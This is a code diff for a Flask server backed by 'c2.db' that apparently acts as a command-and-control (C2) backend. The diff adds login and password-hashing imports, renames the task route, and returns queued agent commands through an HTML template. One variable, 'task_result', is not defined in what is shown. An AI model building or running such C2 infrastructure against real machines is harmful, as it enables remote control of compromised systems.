@@ -3,6 +3,16 @@ from flask import Flask , request, jsonify, render_template
 from flask_sqlalchemy import SQLAlchemy
 import os
 import jinja2
+from flask_bcrypt import Bcrypt
+from flask_migrate import Migrate
+from flask_login import(
+    UserMixin,
+    login_user,
+    LoginManager,
+    current_user,
+    logout_user,
+    login_required,
+)
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -76,7 +86,7 @@ def list_tasks():
 
 
 # we get get/recieve job reqeusts/response
-@app.route("/tasks", methods = [ "POST"])
+@app.route("/output", methods = [ "POST"])
 def tasking():
     data = request.json
     if data == None:
@@ -119,23 +129,24 @@ def tasking():
     if task == None:
         # no work to be done
 
-        return jsonify({})
+        return render_template(
+            'outPut.html'
+        )
     else:
         # have tasked the agent
         task.Status = TASKED
         db.session.commit()
-
-        return jsonify({
+        t=[{
             "status": "ok",
             "type": task.command_type,
             "cmd": task.cmd,
-            "job_id": task.job_id
-        })
-
-
-
-
-
+            "job_id": task.job_id,
+            "task_response": task_result
+        }]
+        return render_template(
+            'outPut.html',
+            t=t
+        )
 
 
 
